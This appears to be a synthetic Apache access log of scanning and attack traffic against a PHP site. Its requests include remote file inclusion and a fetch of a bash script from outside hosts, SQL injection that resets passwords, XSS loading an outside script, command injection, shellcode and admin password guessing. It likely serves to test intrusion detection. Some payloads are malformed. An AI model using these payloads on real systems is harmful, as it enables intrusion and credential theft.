87.251.81.179 - - [18/May/2019:03:10:31 +0200] "GET /update.php/?page=http://192.168.80.128/rfi.php HTTP/1.0" 200 39605 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:10:32 +0200] "GET /authorize.php/\xf9\xa9\xa5\xcc\xa87\x17,b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8 HTTP/1.0" 503 13016 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
209.133.212.79 - - [18/May/2019:03:10:33 +0200] "GET /authorize.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 404 11247 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:10:34 +0200] "GET /api/v1/register/.env/README.txt HTTP/1.0" 200 29216 "/update.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:10:35 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 404 33537 "/api/v1/register/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
87.251.81.179 - - [18/May/2019:03:10:36 +0200] "GET /orders.php/ HTTP/1.1" 503 73698 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:10:37 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.0" 200 52063 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
87.251.81.179 - - [18/May/2019:03:10:38 +0200] "GET /core/files/js/upload.js/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 64819 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:10:39 +0200] "GET /orders.php/ HTTP/1.0" 200 8455 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:10:40 +0200] "GET /update.php/?session=duf8423ufdjr49cce3ije33ssaq2223 HTTP/1.0" 200 24395 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:10:41 +0200] "GET / HTTP/1.0" 200 51623 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:10:42 +0200] "GET /api/v1/customers/ HTTP/1.1" 404 39705 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:10:43 +0200] "GET /index.php/?id=0%20or%201=1 HTTP/1.0" 200 17501 "/register.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:10:44 +0200] "GET / HTTP/1.0" 200 81718 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:10:45 +0200] "GET /index.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 404 35033 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
45.61.164.120 - - [18/May/2019:03:10:46 +0200] "POST /index.php/?post=%3script%3ealert(1); HTTP/1.0" 200 27636 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:10:47 +0200] "GET /login.php/?username=admin&password=1235 HTTP/1.0" 200 87772 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [18/May/2019:03:10:48 +0200] "GET /register.php/ HTTP/1.0" 200 40390 "/api/v1/register/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11"
121.225.26.201 - - [18/May/2019:03:10:49 +0200] "GET /login.php/?username=admin&password=admin2 HTTP/1.0" 504 29872 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
182.34.27.162 - - [18/May/2019:03:10:50 +0200] "GET /orders.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 12187 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:10:51 +0200] "GET /api/v1/login/ HTTP/1.0" 404 10475 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:10:51 +0200] "GET /api/v1/login/ HTTP/1.0" 404 69004 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:10:51 +0200] "GET /api/v1/login/ HTTP/1.0" 404 62158 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:10:51 +0200] "GET /api/v1/login/ HTTP/1.0" 404 1126 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:10:51 +0200] "GET /api/v1/login/ HTTP/1.0" 404 11047 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:10:56 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 28667 "/index.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:10:57 +0200] "GET /?ip=|+ls+-l HTTP/1.0" 200 46908 "/update.php/" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:10:58 +0200] "GET / HTTP/1.0" 200 64044 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
182.34.27.162 - - [18/May/2019:03:10:59 +0200] "GET /orders.php/ HTTP/1.0" 404 40353 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:11:00 +0200] "GET /api/v1/register/?ip=|+ls+-l HTTP/1.0" 403 36169 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:01 +0200] "GET / HTTP/1.0" 200 27315 "/index.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:11:02 +0200] "GET /index.php/ HTTP/1.0" 200 32472 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:11:03 +0200] "GET /api/v1/login/ HTTP/1.0" 404 70367 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:11:04 +0200] "GET / HTTP/1.0" 200 89807 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:05 +0200] "GET /core/themes/theme.inc/?username=admin&password=1236 HTTP/1.1" 200 25052 "/login.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.109.16.162 - - [18/May/2019:03:11:06 +0200] "GET /orders.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 200 23391 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
220.243.135.5 - - [18/May/2019:03:11:07 +0200] "GET /api/v1/customers/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 57361 "/register.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.109.16.162 - - [18/May/2019:03:11:08 +0200] "GET /core/files/js/editor.js/?post=%3script%3ealert(1); HTTP/1.0" 200 25582 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:11:09 +0200] "GET /login.php/?username=admin&password=admin HTTP/1.0" 200 78963 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:11:10 +0200] "GET /?username=admin&password=1235 HTTP/1.1" 200 66655 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:11:11 +0200] "GET /index.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb+3\x88\xd2%z HTTP/1.0" 200 36510 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:11:12 +0200] "GET /?username=admin&password=1237 HTTP/1.0" 200 10774 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:11:13 +0200] "GET /api/v1/register/?id=0%20or%201=1 HTTP/1.1" 200 86963 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
209.133.212.79 - - [18/May/2019:03:11:13 +0200] "GET /api/v1/register/?id=0%20or%201=1 HTTP/1.1" 200 12925 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
209.133.212.79 - - [18/May/2019:03:11:13 +0200] "GET /api/v1/register/?id=0%20or%201=1 HTTP/1.1" 200 88751 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
209.133.212.79 - - [18/May/2019:03:11:13 +0200] "GET /api/v1/register/?id=0%20or%201=1 HTTP/1.1" 200 27220 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
209.133.212.79 - - [18/May/2019:03:11:13 +0200] "GET /api/v1/register/?id=0%20or%201=1 HTTP/1.1" 200 80146 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
62.109.16.162 - - [18/May/2019:03:11:18 +0200] "GET /api/v1/login/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 83084 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
5.13.35.65 - - [18/May/2019:03:11:19 +0200] "GET /core/files/js/upload.js/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 44313 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:11:20 +0200] "GET /?ip=|+ls+-l HTTP/1.0" 200 33168 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
182.34.27.162 - - [18/May/2019:03:11:21 +0200] "GET /register.php/?ip=|+ls+-l HTTP/1.0" 200 77657 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:22 +0200] "GET /index.php/?file=http://evil.eu/root.asp HTTP/1.0" 200 64393 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:11:22 +0200] "GET /index.php/?file=http://evil.eu/root.asp HTTP/1.0" 200 18431 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:11:22 +0200] "GET /index.php/?file=http://evil.eu/root.asp HTTP/1.0" 200 9174 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:11:22 +0200] "GET /index.php/?file=http://evil.eu/root.asp HTTP/1.0" 200 67742 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:11:22 +0200] "GET /index.php/?file=http://evil.eu/root.asp HTTP/1.0" 200 60377 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:11:27 +0200] "GET /connection.php/?username=admin&password=admin2 HTTP/1.0" 200 38865 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:11:28 +0200] "GET /core/files/js/editor.js/?username=admin&password=1238 HTTP/1.0" 200 53241 "/api/v1/login/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
54.36.149.94 - - [18/May/2019:03:11:29 +0200] "GET /?username=admin&password=1238 HTTP/1.0" 404 32756 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:30 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 66953 "/index.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:11:31 +0200] "GET /login.php/?username=admin&password=1238 HTTP/1.0" 200 16542 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:11:32 +0200] "GET /register.php/?username=admin&password=1235 HTTP/1.0" 200 1255 "/login.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:11:33 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.0" 200 35892 "/login.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11"
121.225.26.201 - - [18/May/2019:03:11:34 +0200] "GET /core/files/js/editor.js/?file=http://evil.eu/root.asp HTTP/1.0" 200 84187 "/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:11:35 +0200] "GET / HTTP/1.1" 200 63518 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:36 +0200] "GET / HTTP/1.0" 200 45605 "/register.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:11:37 +0200] "GET /update.php/ HTTP/1.0" 200 6704 "/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
209.133.212.79 - - [18/May/2019:03:11:38 +0200] "GET /login.php/.env/README.txt HTTP/1.0" 200 45645 "/api/v1/register/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:11:39 +0200] "GET /update.php/?username=admin&password=admin HTTP/1.0" 200 65548 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
220.243.135.5 - - [18/May/2019:03:11:40 +0200] "GET / HTTP/1.0" 200 8001 "/api/v1/login/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:41 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 70652 "/api/v1/orders/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.61.164.120 - - [18/May/2019:03:11:42 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 5475 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:43 +0200] "GET /index.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 74568 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:11:44 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.0" 404 73581 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
54.36.149.52 - - [18/May/2019:03:11:45 +0200] "GET /authorize.php/?id=0%20or%201=1 HTTP/1.1" 400 43441 "/core/files/js/upload.js/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.184.238.22 - - [18/May/2019:03:11:46 +0200] "GET /login.php/?file=http://evil.eu/root.asp HTTP/1.1" 200 315 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:47 +0200] "GET /api/v1/login/?username=admin&password=password HTTP/1.0" 200 72285 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:11:48 +0200] "GET /?username=admin&password=1237 HTTP/1.0" 504 74481 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:11:49 +0200] "GET /api/v1/customers/ HTTP/1.0" 504 17828 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
121.225.26.201 - - [18/May/2019:03:11:50 +0200] "GET /api/v1/orders/?file=http://evil.eu/sh HTTP/1.0" 404 2280 "/update.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [18/May/2019:03:11:51 +0200] "GET /login.php/ HTTP/1.0" 200 23521 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:11:52 +0200] "GET /login.php/ HTTP/1.1" 400 27249 "/page/about-us/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:11:53 +0200] "GET /orders.php/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 503 70020 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:11:54 +0200] "GET /api/v1/customers/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 503 43581 "/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
182.34.27.162 - - [18/May/2019:03:11:55 +0200] "GET /api/v1/login/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1" 404 28247 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:11:56 +0200] "GET /?username=admin&password=admin2 HTTP/1.0" 200 16032 "/api/v1/register/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
115.221.121.44 - - [18/May/2019:03:11:57 +0200] "GET /login.php/ HTTP/1.0" 200 11433 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
91.138.198.224 - - [18/May/2019:03:11:58 +0200] "GET /orders.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 40277 "/orders.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:11:59 +0200] "GET /update.php/?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.0" 404 28118 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:00 +0200] "GET /api/v1/login/ HTTP/1.0" 200 69576 "/login.php/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
31.184.238.22 - - [18/May/2019:03:12:01 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 403 71953 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:12:01 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 403 64744 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:12:01 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 403 1843 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:12:01 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 403 15952 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:12:01 +0200] "GET /?username=admin&password=1236 HTTP/1.0" 403 46033 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:12:06 +0200] "GET /login.php/?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git HTTP/1.0" 404 12096 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:12:07 +0200] "GET /api/v1/customers/?username=admin&password=admin2 HTTP/1.0" 403 23202 "/connection.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:12:08 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 15574 "/api/v1/login/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:12:09 +0200] "GET /login.php/?file=http://evil.eu/sh HTTP/1.0" 200 29395 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
115.221.121.44 - - [18/May/2019:03:12:10 +0200] "GET / HTTP/1.0" 200 34231 "/page/about-us/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
87.251.81.179 - - [18/May/2019:03:12:11 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 89568 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:11 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 18105 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:11 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 16305 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
